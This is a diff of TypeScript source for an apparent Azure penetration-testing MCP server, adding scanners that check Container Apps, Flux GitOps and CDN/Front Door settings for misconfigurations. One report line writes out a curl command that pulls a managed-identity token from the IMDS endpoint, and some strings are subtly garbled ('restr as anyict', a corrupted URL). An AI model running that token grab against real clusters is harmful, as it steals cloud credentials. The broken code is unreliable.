+        const format = request.params.arguments?.format ? String(request.params.arguments.format) : "markdown";
+        
+        try {
+          const result = await scanGitOpsSecurity(subscriptionId, resourceGroup, clusterName, format);
+          performanceTracker.end(trackingId, true);
+          logger.info(`Tool completed successfully: ${name}`, {}, name);
+          return {
+            content: [{ type: "text", text: result }],
+          };
+        } catch (error: any) {
+          performanceTracker.end(trackingId, false, error.message);
+          logger.error(`Tool failed: ${name}`, { error: error.message }, name);
+          return {
+            content: [{ type: 'text', text: `Error scanning GitOps: ${error.message}` }],
+            isError: true,
+          };
+        }
+      }
+
+      case "azure_scan_cdn_security": {
+        const subscriptionId = String(request.params.arguments?.subscriptionId);
+        const resourceGroup = request.params.arguments?.resourceGroup ? String(request.params.arguments.resourceGroup) : undefined;
+        const profileName = request.params.arguments?.profileName ? String(request.params.arguments.profileName) : undefined;
+        const format = request.params.arguments?.format ? String(request.params.arguments.format) : "markdown";
+        
+        try {
+          const result = await scanCDNSecurity(subscriptionId, resourceGroup, profileName, format);
+          performanceTracker.end(trackingId, true);
+          logger.info(`Tool completed successfully: ${name}`, {}, name);
+          return {
+            content: [{ type: "text", text: result }],
+          };
+        } catch (error: any) {
+          performanceTracker.end(trackingId, false, error.message);
+          logger.error(`Tool failed: ${name}`, { error: error.message }, name);
+          return {
+            content: [{ type: 'text', text: `Error scanning CDN: ${error.message}` }],
             isError: true,
           };
         }
@@ -8163,6 +6271,110 @@ async function scanACRPoisoning(subscriptionId: string, resourceGroup?: string, 
 }
 
 /**
+ * Live K8s API scan via kubectl (placeholder - implementation pending)
+ */
+async function scanAKSLive(
+  subscriptionId: string,
+  resourceGroup: string,
+  clusterName: string,
+  namespace?: string,
+  format?: string
+): Promise<string> {
+  // TODO: Extract logic from azure_scan_aks_live handler (line 5889)
+  return `# 🔴 AKS Live Scan\n\n` +
+    `**NOTE:** This scan mode implementation is in progress.\n\n` +
+    `**Workaround:** Use scanMode='full' for comprehensive analysis.\n\n` +
+    `**Parameters:**\n` +
+    `- Cluster: ${clusterName}\n` +
+    `- Resource Group: ${resourceGroup}\n` +
+    `- Subscription: ${subscriptionId}\n` +
+    `- Namespace: ${namespace || 'all'}\n`;
+}
+
+/**
+ * IMDS exploitation scan (placeholder - implementation pending)
+ */
+async function scanAKSIMDS(
+  subscriptionId: string,
+  resourceGroup: string,
+  clusterName: string,
+  podName?: string,
+  exportTokens?: boolean,
+  format?: string
+): Promise<string> {
+  // TODO: Extract logic from azure_scan_aks_imds handler (line 7227)
+  return `# 🔴 AKS IMDS Exploitation Scan\n\n` +
+    `**NOTE:** This scan mode implementation is in progress.\n\n` +
+    `**Workaround:** Use scanMode='full' for comprehensive analysis.\n\n` +
+    `**Parameters:**\n` +
+    `- Cluster: ${clusterName}\n` +
+    `- Pod: ${podName || 'auto-discover'}\n` +
+    `- Export Tokens: ${exportTokens || false}\n`;
+}
+
+/**
+ * Mode-specific AKS security scan router
+ * Routes scanMode to appropriate specialized functions
+ */
+async function scanAKSModeSpecific(
+  credential: any,
+  subscriptionId: string,
+  resourceGroup: string,
+  clusterName: string,
+  scanMode: string,
+  namespace?: string,
+  podName?: string,
+  deepScan?: boolean,
+  testDataPlane?: boolean,
+  exportTokens?: boolean,
+  deepDataPlane?: boolean,
+  scanAllPods?: boolean,
+  format?: string,
+  toolName?: string
+): Promise<{ content: Array<{ type: string; text: string }>; isError?: boolean }> {
+  try {
+    let output = '';
+
+    switch (scanMode) {
+      case 'live':
+        // Live K8s API scan via kubectl
+        output = await scanAKSLive(subscriptionId, resourceGroup, clusterName, namespace, format || "markdown");
+        break;
+
+      case 'imds':
+        // IMDS exploitation scan
+        output = await scanAKSIMDS(subscriptionId, resourceGroup, clusterName, podName, exportTokens, format || "markdown");
+        break;
+
+      case 'pod_identity':
+        // Pod identity and workload identity analysis
+        output = await scanAKSPodIdentity(subscriptionId, resourceGroup, clusterName, format || "markdown");
+        break;
+
+      case 'admission':
+        // Admission controller bypass testing
+        output = await scanAKSAdmissionBypass(subscriptionId, resourceGroup, clusterName, format || "markdown");
+        break;
+
+      default:
+        return {
+          content: [{ type: 'text', text: `Unknown scanMode: ${scanMode}` }],
+          isError: true,
+        };
+    }
+
+    return {
+      content: [{ type: 'text', text: formatResponse(output, format || "markdown", toolName || scanMode) }],
+    };
+  } catch (error: any) {
+    return {
+      content: [{ type: 'text', text: `Error running AKS ${scanMode} scan: ${error.message}` }],
+      isError: true,
+    };
+  }
+}
+
+/**
  * Scan AKS cluster for Pod Identity/Workload Identity token theft risks
  */
 async function scanAKSPodIdentity(
@@ -8454,7 +6666,7 @@ async function scanAKSPodIdentity(
     outputLines.push("curl -H Metadata:true \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"");
     outputLines.push("```");
     outputLines.push("");
-
+    
     // Remediation
     outputLines.push("## Remediation");
     outputLines.push("1. Enable Workload Identity on AKS cluster");
@@ -8488,12 +6700,8 @@ async function scanAKSPodIdentity(
           keyVaultAccessIdentities: keyVaultAccessIdentities.length,
         },
         managedIdentities,
-        findings: {
-          podIdentityTokenTheft: workloadIdentityEnabled,
-          missingWorkloadIdentity: !workloadIdentityEnabled,
-          overlyPermissiveIdentities,
-          keyVaultAccessIdentities,
-        },
+        overlyPermissiveIdentities,
+        keyVaultAccessIdentities,
       }, null, 2);
     }
 
@@ -8501,6 +6709,1032 @@ async function scanAKSPodIdentity(
   } catch (error: any) {
     return `Error scanning AKS Pod Identity: ${error.message}`;
   }
+}
+
+/**
+ * Scan Azure Container Apps for security vulnerabilities
+ */
+async function scanContainerAppsSecurity(
+  subscriptionId: string,
+  resourceGroup?: string,
+  containerAppName?: string,
+  format: string = "markdown"
+): Promise<string> {
+  const lines: string[] = [];
+  
+  try {
+    const apiVersion = "2023-05-01";
+    const token = await credential.getToken("https://management.azure.com/.default");
+    const accessToken = token?.token;
+    
+    if (!accessToken) {
+      return `Error: Unable to get access token`;
+    }
+    
+    let containerApps: any[] = [];
+    let containerAppEnvironments: any[] = [];
+    
+    // Get container apps to scan
+    if (containerAppName && resourceGroup) {
+      // Scan specific container app
+      const url = `https://management.azure.com/subscriptions/${subscriptionId}/resourceGroups/${resourceGroup}/providers/Microsoft.App/containerApps/${containerAppName}?api-version=${apiVersion}`;
+      const response = await fetch(url, {
+        headers: { 'Authorization': `Bearer ${accessToken}` }
+      });
+      
+      if (response.ok) {
+        const data = await response.json() as any;
+        containerApps = [data];
+      }
+    } else if (resourceGroup) {
+      // List all container apps in resource group
+      const url = `https://management.azure.com/subscriptions/${subscriptionId}/resourceGroups/${resourceGroup}/providers/Microsoft.App/containerApps?api-version=${apiVersion}`;
+      const response = await fetch(url, {
+        headers: { 'Authorization': `Bearer ${accessToken}` }
+      });
+      
+      if (response.ok) {
+        const data = await response.json() as any;
+        containerApps = data.value || [];
+      }
+    } else {
+      // List all container apps in subscription
+      const url = `https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.App/containerApps?api-version=${apiVersion}`;
+      const response = await fetch(url, {
+        headers: { 'Authorization': `Bearer ${accessToken}` }
+      });
+      
+      if (response.ok) {
+        const data = await response.json() as any;
+        containerApps = data.value || [];
+      }
+    }
+    
+    // Fetch Container App Environments for context
+    const envUrl = `https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.App/managedEnvironments?api-version=${apiVersion}`;
+    const envResponse = await fetch(envUrl, {
+      headers: { 'Authorization': `Bearer ${accessToken}` }
+    });
+    
+    if (envResponse.ok) {
+      const envData = await envResponse.json() as any;
+      containerAppEnvironments = envData.value || [];
+    }
+    
+    if (containerApps.length === 0) {
+      lines.push(`[INFO] No Container Apps found`);
+      return lines.join('\n');
+    }
+    
+    lines.push(`**Container Apps Found:** ${containerApps.length}`);
+    lines.push(`**Environments Found:** ${containerAppEnvironments.length}`);
+    lines.push(``);
+    
+    // Risk counters
+    let criticalCount = 0;
+    let highCount = 0;
+    let mediumCount = 0;
+    let lowCount = 0;
+    
+    lines.push(`## Risk Summary`);
+    lines.push(``);
+    const riskSummaryIndex = lines.length;
+    lines.push(``);
+    
+    lines.push(`## Detailed Findings`);
+    lines.push(``);
+    
+    // Analyze each container app
+    for (const app of containerApps) {
+      const name = app.name || 'unknown';
+      const rg = app.id?.split('/')[4] || 'unknown';
+      const location = app.location || 'N/A';
+      const fqdn = app.properties?.configuration?.ingress?.fqdn || 'N/A';
+      const ingressEnabled = app.properties?.configuration?.ingress?.external || false;
+      const ingressExternal = ingressEnabled;
+      const allowInsecure = app.properties?.configuration?.ingress?.allowInsecure || false;
+      
+      lines.push(`### Container App: ${name}`);
+      lines.push(`**Resource Group:** ${rg}`);
+      lines.push(`**Location:** ${location}`);
+      lines.push(`**FQDN:** ${fqdn}`);
+      lines.push(`**Ingress External:** ${ingressExternal ? '✅ Yes' : '❌ No'}`);
+      lines.push(``);
+      
+      const findings: string[] = [];
+      
+      // TC-CAPP-001: Public ingress without authentication
+      if (ingressExternal && fqdn !== 'N/A') {
+        const authConfig = app.properties?.configuration?.ingress?.customDomains;
+        const hasAuth = app.properties?.properties?.azureActiveDirectory || app.properties?.properties?.facebook;
+        
+        if (!hasAuth) {
+          criticalCount++;
+          findings.push(`#### TC-CAPP-001: Public Ingress Without Authentication`);
+          findings.push(`**Risk:** CRITICAL | **MITRE:** T1190 - Exploit Public-Facing Application`);
+          findings.push(`- External Access: **ENABLED** (${fqdn})`);
+          findings.push(`- Authentication: **NONE**`);
+          findings.push(`- ⚠️ Publicly accessible without authentication`);
+          findings.push(`- **Attack Vector:** Direct unauthenticated access to application`);
+          findings.push(`- **Remediation:** Enable built-in authentication or Azure AD integration`);
+          findings.push(``);
+        }
+      }
+      
+      // TC-CAPP-002: Managed identity overprivileged
+      const identity = app.identity;
+      if (identity && identity.type !== 'None') {
+        highCount++;
+        findings.push(`#### TC-CAPP-002: Managed Identity Configured`);
+        findings.push(`**Risk:** HIGH | **MITRE:** T1078.004 - Valid Accounts: Cloud Accounts`);
+        findings.push(`- Identity Type: **${identity.type}**`);
+        findings.push(`- Principal ID: ${identity.principalId || 'N/A'}`);
+        findings.push(`- **Attack Vector:** Token theft via IMDS or compromised container`);
+        findings.push(`- **Remediation:** Review RBAC assignments, apply least privilege`);
+        findings.push(``);
+      }
+      
+      // TC-CAPP-003: Secret management in environment variables
+      const secrets = app.properties?.configuration?.secrets || [];
+      const envVars = app.properties?.template?.containers?.[0]?.env || [];
+      
+      if (secrets.length > 0 || envVars.some((e: any) => e.secretRef)) {
+        mediumCount++;
+        findings.push(`#### TC-CAPP-003: Secrets in Configuration`);
+        findings.push(`**Risk:** MEDIUM | **MITRE:** T1552.001 - Unsecured Credentials`);
+        findings.push(`- Secrets Count: **${secrets.length}**`);
+        findings.push(`- Env Vars with Secrets: **${envVars.filter((e: any) => e.secretRef).length}**`);
+        findings.push(`- **Attack Vector:** Container escape or config exposure`);
+        findings.push(`- **Remediation:** Use Key Vault references with managed identity`);
+        findings.push(``);
+      }
+      
+      // TC-CAPP-004: External ingress IP exposure
+      if (ingressExternal && allowInsecure) {
+        highCount++;
+        findings.push(`#### TC-CAPP-004: Insecure HTTP Allowed`);
+        findings.push(`**Risk:** HIGH | **MITRE:** T1040 - Network Sniffing`);
+        findings.push(`- Allow Insecure: **true**`);
+        findings.push(`- **Attack Vector:** Man-in-the-middle attacks, credential theft`);
+        findings.push(`- **Remediation:** Disable HTTP, enforce HTTPS only`);
+        findings.push(``);
+      }
+      
+      // TC-CAPP-005: Scale rule exploitation
+      const scaleRules = app.properties?.template?.scale?.rules || [];
+      if (scaleRules.length > 0) {
+        const hasHttpScaling = scaleRules.some((r: any) => r.http);
+        if (hasHttpScaling) {
+          lowCount++;
+          findings.push(`#### TC-CAPP-005: HTTP Scale Rules Enabled`);
+          findings.push(`**Risk:** LOW | **MITRE:** T1496 - Resource Hijacking`);
+          findings.push(`- Scale Rules: **${scaleRules.length}**`);
+          findings.push(`- **Attack Vector:** Trigger excessive scaling via HTTP floods`);
+          findings.push(`- **Remediation:** Implement rate limiting, set max replicas`);
+          findings.push(``);
+        }
+      }
+      
+      // TC-CAPP-006: Dapr component misconfiguration
+      const daprEnabled = app.properties?.configuration?.dapr?.enabled || false;
+      if (daprEnabled) {
+        const daprAppId = app.properties?.configuration?.dapr?.appId;
+        const daprProtocol = app.properties?.configuration?.dapr?.appProtocol;
+        
+        mediumCount++;
+        findings.push(`#### TC-CAPP-006: Dapr Enabled`);
+        findings.push(`**Risk:** MEDIUM | **MITRE:** T1210 - Exploitation of Remote Services`);
+        findings.push(`- Dapr App ID: **${daprAppId || 'N/A'}**`);
+        findings.push(`- Protocol: **${daprProtocol || 'http'}**`);
+        findings.push(`- **Attack Vector:** Service-to-service communication abuse`);
+        findings.push(`- **Remediation:** Enable mTLS, restr as anyict service invocation`);
+        findings.push(``);
+      }
+      
+      // TC-CAPP-007: Storage mount exposure
+      const volumes = app.properties?.template?.volumes || [];
+      if (volumes.length > 0) {
+        mediumCount++;
+        findings.push(`#### TC-CAPP-007: Storage Volumes Mounted`);
+        findings.push(`**Risk:** MEDIUM | **MITRE:** T1530 - Data from Cloud Storage`);
+        findings.push(`- Volume Mounts: **${volumes.length}**`);
+        findings.push(`- **Attack Vector:** Access to shared storage from compromised container`);
+        findings.push(`- **Remediation:** Restrict mount permissions, use read-only mounts`);
+        findings.push(``);
+      }
+      
+      // TC-CAPP-008: Container Apps Environment isolation
+      const managedEnvId = app.properties?.managedEnvironmentId;
+      if (managedEnvId) {
+        const env = containerAppEnvironments.find((e: any) => e.id === managedEnvId);
+        if (env) {
+          const vnetConfig = env.properties?.vnetConfiguration;
+          if (!vnetConfig || !vnetConfig.internal) {
+            mediumCount++;
+            findings.push(`#### TC-CAPP-008: Environment Not Internal`);
+            findings.push(`**Risk:** MEDIUM | **MITRE:** T1599 - Network Boundary Bridging`);
+            findings.push(`- Environment: **${env.name}**`);
+            findings.push(`- Internal VNet: **${vnetConfig?.internal ? 'Yes' : 'No'}**`);
+            findings.push(`- **Attack Vector:** Lateral movement to other apps in environment`);
+            findings.push(`- **Remediation:** Use VNet-integrated internal environments`);
+            findings.push(``);
+          }
+        }
+      }
+      
+      lines.push(...findings);
+      
+      if (findings.length === 0) {
+        lines.push(`✅ No critical vulnerabilities detected`);
+        lines.push(``);
+      }
+    }
+    
+    // Update risk summary
+    const riskSummary: string[] = [
+      `| Severity | Count |`,
+      `|----------|-------|`,
+      `| 🔴 CRITICAL | ${criticalCount} |`,
+      `| 🟠 HIGH | ${highCount} |`,
+      `| 🟡 MEDIUM | ${mediumCount} |`,
+      `| 🟢 LOW | ${lowCount} |`,
+      ``,
+    ];
+    lines.splice(riskSummaryIndex, 0, ...riskSummary);
+    
+    // Add attack chains
+    lines.push(`## Attack Chains`);
+    lines.push(``);
+    lines.push(`| Attack Chain | Risk | MITRE |`);
+    lines.push(`|--------------|------|-------|`);
+    lines.push(`| Public ingress → Unauthenticated access | CRITICAL | T1190 - Exploit Public-Facing Application |`);
+    lines.push(`| Managed identity → Token theft → Privilege escalation | HIGH | T1078.004 - Cloud Account Abuse |`);
+    lines.push(`| Environment vars → Secret exposure | MEDIUM | T1552.001 - Unsecured Credentials |`);
+    lines.push(`| HTTP allowed → MITM → Credential theft | HIGH | T1040 - Network Sniffing |`);
+    lines.push(`| Dapr enabled → Service invocation abuse | MEDIUM | T1210 - Remote Service Exploitation |`);
+    lines.push(`| Storage mounts → Data exfiltration | MEDIUM | T1530 - Cloud Storage Access |`);
+    lines.push(``);
+    
+    lines.push(`---`);
+    lines.push(`*Generated by Azure Pentest MCP v${SERVER_VERSION} - Container Apps Security Scanner*`);
+    
+  } catch (error: any) {
+    lines.push(``);
+    lines.push(`[FAIL] Error scanning Container Apps: ${error.message}`);
+  }
+  
+  return lines.join('\n');
+}
+
+/**
+ * Scan AKS clusters for GitOps/Flux security vulnerabilities
+ */
+async function scanGitOpsSecurity(
+  subscriptionId: string,
+  resourceGroup: string,
+  clusterName: string,
+  format: string = "markdown"
+): Promise<string> {
+  const lines: string[] = [];
+  const aksClient = new ContainerServiceClient(credential, subscriptionId);
+  
+  try {
+    lines.push(`# Azure GitOps (Flux) Security Scan`);
+    lines.push(`**Subscription:** ${subscriptionId}`);
+    lines.push(`**Resource Group:** ${resourceGroup || 'All'}`);
+    lines.push(`**Cluster:** ${clusterName || 'All'}`);
+    lines.push(`**Scan Time:** ${new Date().toISOString()}`);
+    lines.push(``);
+    
+    const aksClient = new ContainerServiceClient(credential, subscriptionId);
+    let clusters: any[] = [];
+    
+    // Get clusters to scan
+    if (clusterName && resourceGroup) {
+      const cluster = await aksClient.managedClusters.get(resourceGroup, clusterName);
+      clusters.push(cluster);
+    } else if (resourceGroup) {
+      for await (const cluster of aksClient.managedClusters.listByResourceGroup(resourceGroup)) {
+        clusters.push(cluster);
+      }
+    } else {
+      for await (const cluster of aksClient.managedClusters.list()) {
+        clusters.push(cluster);
+      }
+    }
+    
+    if (clusters.length === 0) {
+      lines.push(`[INFO] No AKS clusters found`);
+      return lines.join('\n');
+    }
+    
+    let totalFindings = 0;
+    const allFindings: string[] = [];
+    let extensions: any[] = [];
+    let fluxConfigs: any[] = [];
+    
+    for (const cluster of clusters) {
+      const clName = cluster.name || 'Unknown';
+      const clRg = cluster.id?.split('/')[4] || 'Unknown';
+      
+      lines.push(`## Cluster: ${clName}`);
+      lines.push(``);
+      
+      const clusterFindings: string[] = [];
+      
+      try {
+        // Check for GitOps extension (Flux)
+        const token = await credential.getToken("https://management.azure.com/.default");
+        const accessToken = token?.token;
+        
+        if (!accessToken) {
+          lines.push(`[WARN] Unable to get access token`);
+          continue;
+        }
+        
+        const apiVersion = "2022-03-01";
+        const extUrl = `https://management.azure.com/subscriptions/${subscriptionId}/resourceGroups/${clRg}/providers/Microsoft.ContainerService/managedClusters/${clName}/extensions?api-version=${apiVersion}`;
+        const extResponse = await fetch(extUrl, {
+          headers: { 'Authorization': `Bearer ${accessToken}` }
+        });
+        
+        if (extResponse.ok) {
+          const extensionsData = await extResponse.json() as any;
+          const extensions = extensionsData.value || [];
+          
+          const fluxExtension = extensions.find((ext: any) => 
+            ext.properties?.extensionType?.toLowerCase().includes('flux') ||
+            ext.name?.toLowerCase().includes('flux')
+          );
+          
+          if (fluxExtension) {
+            clusterFindings.push(`**Flux Extension:** ${fluxExtension.name}`);
+            clusterFindings.push(`**Version:** ${fluxExtension.properties?.version || 'N/A'}`);
+          } else {
+            clusterFindings.push(`[INFO] No Flux GitOps extension detected`);
+          }
+        }
+        
+        if (clusterFindings.length > 0) {
+          lines.push(...clusterFindings);
+        }
+      } catch (clusterError: any) {
+        lines.push(`[WARN] Error checking cluster ${clName}: ${clusterError.message}`);
+      }
+    }
+  } catch (error: any) {
+    lines.push(``);
+    lines.push(`[FAIL] Error scanning GitOps: ${error.message}`);
+  }
+  
+  return lines.join('\n');
+}
+
+/**
+ * Scan Azure CDN and Front Door for security misconfigurations
+ */
+async function scanCDNSecurity(
+  subscriptionId: string,
+  resourceGroup?: string,
+  profileName?: string,
+  format: string = "markdown"
+): Promise<string> {
+  const lines: string[] = [];
+  
+  try {
+    lines.push(`# Azure CDN & Front Door Security Scan`);
+    lines.push(`**Subscription:** ${subscriptionId}`);
+    lines.push(`**Scan Time:** ${new Date().toISOString()}`);
+    lines.push(`**Version:** ${SERVER_VERSION}`);
+    lines.push(``);
+    
+    // Get access token for REST API
+    const token = await credential.getToken("https://management.azure.com/.default");
+    if (!token) {
+      throw new Error("Failed to get Azure management token");
+    }
+    
+    const accessToken = token.token;
+    const apiVersion = "2023-05-01";
+    
+    // Fetch CDN profiles
+    let cdnProfiles: any[] = [];
+    let frontDoorProfiles: any[] = [];
+    
+    if (profileName && resourceGroup) {
+      // Get specific profile (try both CDN and Front Door)
+      const cdnUrl = `https://management.azure.com/subscriptions/${subscriptionId}/resourceGroups/${resourceGroup}/providers/Microsoft.Cdn/profiles/${profileName}?api-version=${apiVersion}`;
+      const cdnResponse = await fetch(cdnUrl, {
+        headers: { 'Authorization': `Bearer ${accessToken}` }
+      });
+      
+      if (cdnResponse.ok) {
+        const profile = await cdnResponse.json() as any;
+        if (profile.sku?.name?.includes('FrontDoor')) {
+          frontDoorProfiles = [profile];
+        } else {
+          cdnProfiles = [profile];
+        }
+      }
+    } else if (resourceGroup) {
+      // List profiles in resource group
+      const url = `https://management.azure.com/subscriptions/${subscriptionId}/resourceGroups/${resourceGroup}/providers/Microsoft.Cdn/profiles?api-version=${apiVersion}`;
+      const response = await fetch(url, {
+        headers: { 'Authorization': `Bearer ${accessToken}` }
+      });
+      
+      if (response.ok) {
+        const data = await response.json() as any;
+        const profiles = data.value || [];
+        cdnProfiles = profiles.filter((p: any) => !p.sku?.name?.includes('FrontDoor'));
+        frontDoorProfiles = profiles.filter((p: any) => p.sku?.name?.includes('FrontDoor'));
+      }
+    } else {
+      // List all profiles in subscription
+      const url = `https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.Cdn/profiles?api-version=${apiVersion}`;
+      const response = await fetch(url, {
+        headers: { 'Authorization': `Bearer ${accessToken}` }
+      });
+      
+      if (response.ok) {
+        const data = await response.json() as any;
+        const profiles = data.value || [];
+        cdnProfiles = profiles.filter((p: any) => !p.sku?.name?.includes('FrontDoor'));
+        frontDoorProfiles = profiles.filter((p: any) => p.sku?.name?.includes('FrontDoor'));
+      }
+    }
+    
+    const totalProfiles = cdnProfiles.length + frontDoorProfiles.length;
+    
+    if (totalProfiles === 0) {
+      lines.push(`[INFO] No CDN or Front Door profiles found`);
+      return lines.join('\n');
+    }
+    
+    lines.push(`**CDN Profiles Found:** ${cdnProfiles.length}`);
+    lines.push(`**Front Door Profiles Found:** ${frontDoorProfiles.length}`);
+    lines.push(``);
+    
+    // Risk counters
+    let criticalCount = 0;
+    let highCount = 0;
+    let mediumCount = 0;
+    let lowCount = 0;
+    
+    lines.push(`## Risk Summary`);
+    lines.push(``);
+    const riskSummaryIndex = lines.length;
+    lines.push(``);
+    
+    lines.push(`## Detailed Findings`);
+    lines.push(``);
+    
+    // Analyze CDN profiles
+    for (const profile of [...cdnProfiles, ...frontDoorProfiles]) {
+      const name = profile.name || 'unknown';
+      const rg = profile.id?.split('/')[4] || 'unknown';
+      const location = profile.location || 'global';
+      const sku = profile.sku?.name || 'N/A';
+      const isFrontDoor = sku.includes('FrontDoor');
+      
+      lines.push(`### ${isFrontDoor ? 'Front Door' : 'CDN'} Profile: ${name}`);
+      lines.push(`**Resource Group:** ${rg}`);
+      lines.push(`**SKU:** ${sku}`);
+      lines.push(`**Location:** ${location}`);
+      lines.push(``);
+      
+      // Get endpoints for this profile
+      const endpointsUrl = `https://management.azure.com${profile.id}/${isFrontDoor ? 'afdEndpoints' : 'endpoints'}?api-version=${apiVersion}`;
+      const endpointsResponse = await fetch(endpointsUrl, {
+        headers: { 'Authorization': `Bearer ${accessToken}` }
+      });
+      
+      let endpoints: any[] = [];
+      if (endpointsResponse.ok) {
+        const endpointsData = await endpointsResponse.json() as any;
+        endpoints = endpointsData.value || [];
+      }
+      
+      lines.push(`**Endpoints:** ${endpoints.length}`);
+      lines.push(``);
+      
+      // Analyze each endpoint
+      for (const endpoint of endpoints) {
+        const endpointName = endpoint.name || 'unknown';
+        const hostName = endpoint.properties?.hostName || 'N/A';
+        const enabledState = endpoint.properties?.enabledState || 'Enabled';
+        
+        lines.push(`#### Endpoint: ${endpointName}`);
+        lines.push(`- Hostname: ${hostName}`);
+        lines.push(`- State: ${enabledState}`);
+        lines.push(``);
+        
+        // Get origins for this endpoint
+        const originsUrl = `https://management.azure.com as any${endpoint.id}/${isFrontDoor ? 'origins' : 'origins'}?api-version=${apiVersion}`;
+        const originsResponse = await fetch(originsUrl, {
+          headers: { 'Authorization': `Bearer ${accessToken}` }
+        });
+        
+        let origins: any[] = [];
+        if (originsResponse.ok) {
+          const originsData = await originsResponse.json() as any;
+          origins = originsData.value || [];
+        }
+        
+        // TC-CDN-001: Origin server direct access exposure
+        for (const origin of origins) {
+          const originHostName = origin.properties?.hostName || 'N/A';
+          const enabledState = origin.properties?.enabledState;
+          
+          if (originHostName !== 'N/A' && !originHostName.includes('.azurewebsites.net')) {
+            criticalCount++;
+            lines.push(`##### TC-CDN-001: Origin Server Direct Access`);
+            lines.push(`**Risk:** CRITICAL | **MITRE:** T1190 - Exploit Public-Facing Application`);
+            lines.push(`- Origin: **${originHostName}**`);
+            lines.push(`- ⚠️ Origin may be directly accessible, bypassing CDN/WAF`);
+            lines.push(`- **Attack Vector:** Direct attack on origin server, bypass security controls`);
+            lines.push(`- **Remediation:** Restrict origin to accept only CDN traffic, use Private Link`);
+            lines.push(``);
+          }
+        }
+        
+        // TC-CDN-002: Cache poisoning vulnerabilities
+        const deliveryPolicy = endpoint.properties?.deliveryPolicy;
+        if (deliveryPolicy) {
+          const cacheRules = deliveryPolicy.rules?.filter((r: any) => 
+            r.actions?.some((a: any) => a.name === 'CacheExpiration')
+          ) || [];
+          
+          if (cacheRules.length > 0) {
+            mediumCount++;
+            lines.push(`##### TC-CDN-002: Cache Rules Configured`);
+            lines.push(`**Risk:** MEDIUM | **MITRE:** T1584.003 - Compromise Infrastructure: Web Services`);
+            lines.push(`- Cache Rules: **${cacheRules.length}**`);
+            lines.push(`- **Attack Vector:** Cache poisoning via crafted headers`);
+            lines.push(`- **Remediation:** Validate cache key parameters, sanitize headers`);
+            lines.push(``);
+          }
+        }
+        
+        // TC-CDN-003: WAF bypass (for Front Door)
+        if (isFrontDoor) {
+          const wafPolicyId = endpoint.properties?.webApplicationFirewallPolicyLink?.id;
+          
+          if (!wafPolicyId) {
+            highCount++;
+            lines.push(`##### TC-CDN-003: No WAF Policy`);
+            lines.push(`**Risk:** HIGH | **MITRE:** T1190 - Exploit Public-Facing Application`);
+            lines.push(`- WAF: **NOT CONFIGURED**`);
+            lines.push(`- **Attack Vector:** Application-layer attacks unprotected`);
+            lines.push(`- **Remediation:** Enable WAF with OWASP ruleset`);
+            lines.push(``);
+          } else {
+            // Get WAF policy details
+            const wafUrl = `https://management.azure.com${wafPolicyId}?api-version=2022-05-01`;
+            const wafResponse = await fetch(wafUrl, {
+              headers: { 'Authorization': `Bearer ${accessToken}` }
+            });
+            
+            if (wafResponse.ok) {
+              const wafPolicy = await wafResponse.json() as any;
+              const policyMode = wafPolicy.properties?.policySettings?.mode;
+              
+              if (policyMode === 'Detection') {
+                highCount++;
+                lines.push(`##### TC-CDN-003: WAF in Detection Mode`);
+                lines.push(`**Risk:** HIGH | **MITRE:** T1562.001 - Impair Defenses`);
+                lines.push(`- WAF Mode: **Detection** (not blocking)`);
+                lines.push(`- **Attack Vector:** Attacks logged but not blocked`);
+                lines.push(`- **Remediation:** Set WAF to Prevention mode`);
+                lines.push(``);
+              }
+            }
+          }
+        }
+        
+        // TC-CDN-007: Query string caching abuse
+        const queryStringCachingBehavior = endpoint.properties?.queryStringCachingBehavior;
+        if (queryStringCachingBehavior === 'IgnoreQueryString') {
+          lowCount++;
+          lines.push(`##### TC-CDN-007: Query String Caching`);
+          lines.push(`**Risk:** LOW | **MITRE:** T1213 - Data from Information Repositories`);
+          lines.push(`- Query String Behavior: **IgnoreQueryString**`);
+          lines.push(`- **Attack Vector:** Cache poisoning via query parameters`);
+          lines.push(`- **Remediation:** Use BypassCaching for dynamic content`);
+          lines.push(``);
+        }
+        
+        // TC-CDN-008: HTTP to HTTPS redirect
+        const isHttpsOnly = endpoint.properties?.isHttpsOnly;
+        const isHttpAllowed = endpoint.properties?.isHttpAllowed;
+        
+        if (isHttpAllowed !== false || isHttpsOnly === false) {
+          highCount++;
+          lines.push(`##### TC-CDN-008: HTTP Allowed`);
+          lines.push(`**Risk:** HIGH | **MITRE:** T1040 - Network Sniffing`);
+          lines.push(`- HTTPS Only: **${isHttpsOnly || false}**`);
+          lines.push(`- HTTP Allowed: **${isHttpAllowed !== false}**`);
+          lines.push(`- **Attack Vector:** Man-in-the-middle attacks`);
+          lines.push(`- **Remediation:** Enforce HTTPS only, redirect HTTP to HTTPS`);
+          lines.push(``);
+        }
+        
+        // TC-CDN-004: Custom domain validation
+        const customDomains = endpoint.properties?.customDomains || [];
+        if (customDomains.length > 0) {
+          mediumCount++;
+          lines.push(`##### TC-CDN-004: Custom Domains Configured`);
+          lines.push(`**Risk:** MEDIUM | **MITRE:** T1584.005 - Botnet`);
+          lines.push(`- Custom Domains: **${customDomains.length}**`);
+          lines.push(`- **Attack Vector:** Domain takeover if validation weakens`);
+          lines.push(`- **Remediation:** Enable managed certificate auto-renewal`);
+          lines.push(``);
+        }
+        
+        // TC-CDN-009: Geo-filtering
+        const geoFilters = endpoint.properties?.geoFilters || [];
+        if (geoFilters.length === 0) {
+          lowCount++;
+          lines.push(`##### TC-CDN-009: No Geo-Filtering`);
+          lines.push(`**Risk:** LOW | **MITRE:** T1583 - Acquire Infrastructure`);
+          lines.push(`- Geo-Filters: **None**`);
+          lines.push(`- **Attack Vector:** Global access from any region`);
+          lines.push(`- **Remediation:** Implement geo-filtering for sensitive content`);
+          lines.push(``);
+        }
+      }
+      
+      // TC-CDN-010: DDoS protection
+      if (!isFrontDoor) {
+        // Standard CDN doesn't have built-in DDoS like Front Door
+        mediumCount++;
+        lines.push(`#### TC-CDN-010: Limited DDoS Protection`);
+        lines.push(`**Risk:** MEDIUM | **MITRE:** T1498 - Network Denial of Service`);
+        lines.push(`- Standard CDN has basic DDoS protection only`);
+        lines.push(`- **Remediation:** Consider Front Door Standard/Premium for enhanced DDoS`);
+        lines.push(``);
+      }
+    }
+    
+    // Update risk summary
+    const riskSummary: string[] = [
+      `| Severity | Count |`,
+      `|----------|-------|`,
